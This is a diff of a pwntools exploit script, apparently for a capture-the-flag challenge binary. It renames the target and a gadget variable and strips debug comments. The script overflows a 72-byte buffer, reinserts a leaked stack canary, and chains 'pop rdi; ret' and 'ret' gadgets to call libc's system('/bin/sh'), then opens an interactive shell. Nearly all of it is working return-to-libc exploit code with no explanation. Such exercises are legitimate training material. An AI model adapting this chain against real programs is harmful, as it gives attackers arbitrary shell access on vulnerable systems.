@@ -1,6 +1,6 @@
 from pwn import *
 
-target = './chal_13'
+target = './chal_new'
 context.os = 'linux'
 context.arch = 'amd64'
 context.binary = target
@@ -9,8 +9,7 @@ binary = ELF(target)
 libc = binary.libc
 addr = libc.symbols['system']
 arg = next(libc.search('/bin/sh\x00'))
-#print(libc, hex(addr), hex(arg))
-gadget = 0x0002a3e5 # pop rdi; ret
+gadget_1 = 0x0002a3e5 # pop rdi; ret
 gadget_2 = 0x00029139 # ret
 offset = 72
 
@@ -26,19 +25,11 @@ payload = b'A' * offset
 payload += pack(int(canary, 16))
 payload += b'AAAAAAAA'
 payload += pack(libc_base+gadget_2)
-payload += pack(libc_base+gadget)
+payload += pack(libc_base+gadget_1)
 payload += pack(libc_base+arg)
-#payload += pack(0x40101a)
 payload += pack(libc_base+addr)
 payload += b'AAAAAAAA'
 payload += pack(libc_base+arg)
-
-"""
-gdb.attach(proc, '''
-    
-''')
-"""
-
 
 proc.sendline(payload)
 proc.interactive()
